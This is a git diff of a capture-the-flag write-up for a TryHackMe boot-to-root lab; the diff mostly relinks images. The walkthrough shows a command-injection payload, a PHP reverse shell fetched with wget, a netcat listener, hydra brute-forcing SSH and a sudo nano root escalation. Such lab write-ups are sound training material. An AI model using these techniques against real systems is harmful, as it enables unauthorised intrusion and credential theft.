@@ -1,6 +1,6 @@
 ## Boot2Root BootCamp [THM]
 
-
+![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/9ce0a116-eb8c-4cb2-93e5-a677da21c60f)
 
 Link: https://tryhackme.com/room/boot2rootbootcamp
 
@@ -43,7 +43,7 @@ Nmap done: 1 IP address (1 host up) scanned in 47.19 seconds
 
 ## view web [port 80]
 
-![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/a9305310-0b93-4910-82b4-cde266bd1bc4)
+![image](images/258144536-a9305310-0b93-4910-82b4-cde266bd1bc4.png)
 
 ## dirsearch
 
@@ -65,7 +65,7 @@ Task Completed
 
 ## robots.txt
 
-![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/da0afcd7-0136-4c29-a022-2b3fd404a49b)
+![image](images/258146048-da0afcd7-0136-4c29-a022-2b3fd404a49b.png)
 
 - found directory /th15_1mp0551bl3_t0_f1nd/
 
@@ -89,25 +89,25 @@ Task Completed
 
 ## index.php
 
-![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/cfe24485-2750-49dc-aa76-f5513722915a)
+![image](images/258149773-cfe24485-2750-49dc-aa76-f5513722915a.png)
 
 - the bold "please" maybe a hint for this page
 
-## exploit using parameter please [basic RCE]
+## exploit using parameter [basic RCE]
 
-![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/c954b127-5ed3-4492-bc76-baa7790e0848)
+![image](images/258151638-c954b127-5ed3-4492-bc76-baa7790e0848.png)
 
 - payload `index.php?please=whoami`
 
 ## upload reverse shell using wget
 
-![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/b4aaad46-51fa-438a-83a1-b7cfcfd51cbb)
+![image](images/258156320-b4aaad46-51fa-438a-83a1-b7cfcfd51cbb.png)
 
 - create php reverse shell, open python web server `python3 -m http.server <port>` to transfer from local to server
 
 ## setup netcat listener
 
-![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/caeae79e-b4e0-4244-9905-b3616c7e19a5)
+![image](images/258158483-caeae79e-b4e0-4244-9905-b3616c7e19a5.png)
 
 - goto `http://10.10.0.138/th15_1mp0551bl3_t0_f1nd/rev.php` dont forget to open listener `nc -lnvp 1337` on terminal
 - `python3 -c 'import pty;pty.spawn("/bin/bash")'` to upgrade shell
@@ -115,18 +115,18 @@ Task Completed
 
 ## cd /home/human
 
-![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/87a0bdbe-4a58-4d8d-b548-36ccc42c9834)
+![image](images/258160480-87a0bdbe-4a58-4d8d-b548-36ccc42c9834.png)
 
 - user.txt
 - password_list.txt
 
 ## user.txt
 
-![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/97c1876b-a001-405c-97a2-6701a32042a9)
+![image](images/258160917-97c1876b-a001-405c-97a2-6701a32042a9.png)
 
 ## download password_list.txt
 
-![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/fd7f31df-c871-4759-b906-31a07e1a3374)
+![image](images/258167500-fd7f31df-c871-4759-b906-31a07e1a3374.png)
 
 - same process with upload reverse shell, but this from server to local
 
@@ -145,26 +145,26 @@ Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in mi
 
 ## connect ssh [port 22]
 
-![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/b8a0decb-0bce-44dd-bdb4-037f35a8eccc)
+![image](images/258172490-b8a0decb-0bce-44dd-bdb4-037f35a8eccc.png)
 
 - using credentials found from hydra
 
 ## privilege escalation
 
-![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/59816c82-2995-42dc-b98c-b167107c4d41)
+![image](images/258173206-59816c82-2995-42dc-b98c-b167107c4d41.png)
 
 - using `sudo -l`
 
-![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/aa909129-ee16-46b3-8671-329476d6bd24)
+![image](images/258173856-aa909129-ee16-46b3-8671-329476d6bd24.png)
 
 - Search GTFObins for [nano](https://gtfobins.github.io/gtfobins/nano/)
 
-![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/b55b6c18-f050-4a7d-afc8-fe84e7c44296)
+![image](images/258174595-b55b6c18-f050-4a7d-afc8-fe84e7c44296.png)
 
 - root!
 
 ## root.txt
 
-![image](https://github.com/0hanif0/B2R-Writeups/assets/23289982/45361027-e1fa-4e3e-8cc2-c946f667555f)
+![image](images/258174916-45361027-e1fa-4e3e-8cc2-c946f667555f.png)
 
 - PWNED! :star:
